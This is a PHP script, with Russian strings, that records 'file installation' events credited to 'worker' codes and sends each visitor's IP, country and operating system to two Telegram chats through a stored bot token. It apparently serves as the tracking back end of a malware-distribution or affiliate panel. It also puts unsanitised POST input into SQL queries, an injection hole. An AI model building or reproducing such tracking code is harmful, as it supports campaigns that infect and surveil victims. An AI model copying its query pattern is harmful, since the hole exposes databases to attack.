<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

require "./config.php";
$code = $_POST['code'];
$user = "";

if ($code != "default") {
    $codeMessage = "🔢Код: " . $code;
    echo $code;
    $code = $mysqli->query("SELECT * FROM `codes` WHERE `code` = '$code'")->fetch_assoc();
    $userId = $code['userId'];
    echo $userId;
    $result = $mysqli->query("SELECT * FROM `users` WHERE `id` = '$userId'");
    $user = $result->fetch_assoc();
} else {
    $codeMessage = "🔢Код: Не указан";
}
$username = "Не указан";
if (isset($user) && $user != "") {
    $username = $user ? "#".$user['name'] : "Не указано";
}
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getRealIpAddr();
$flagCountry = json_decode(file_get_contents("http://ip-api.com/json/$ip"))->countryCode;


$device = strpos($_SERVER['HTTP_USER_AGENT'], 'Macintosh') !== false ? 'MacOS' : 'Windows';
$message = "☑️ Установка файла\n---------------------------------------\n" . $codeMessage . "\n👷🏻‍♂️Воркер:" .$username . "\n---------------------------------------\n🖥Устройство:" . $device ."\n🌍IP:" . $ip. " " . $flagCountry;
// Экранируем символы '-' и '.' в сообщении для Telegram
$messageEscaped = str_replace('-', '\-', $message);
$messageEscaped = str_replace('.', '\.', $messageEscaped);

$messageEscaped = str_replace('#', '\#', $messageEscaped);

$bot = $mysqli->query("SELECT * FROM `settings` WHERE `id` = 1");
$bot = $bot->fetch_assoc();
$botToken = $bot['telegramBotToken'];
$chatId = $bot['chatId'];

sendTelegram($chatId, $messageEscaped, $botToken);
sendTelegram($bot['chatId2'], $messageEscaped, $botToken);


function sendTelegram($chatId, $message, $botToken)
{
    // Формируем URL для отправки сообщения через Telegram Bot API
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Параметры запроса
    $params = [
        'chat_id' => $chatId,
        'text' => urldecode($message),
        'parse_mode' => "MarkdownV2"
    ];

    // Инициализируем cURL сессию
    $ch = curl_init();

    // Устанавливаем опции cURL
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Выполняем запрос к API Telegram
    $response = curl_exec($ch);
    echo $response;
    // Закрываем cURL сессию
    curl_close($ch);
}
echo 'Сообщение успешно отправлено в Telegram!';

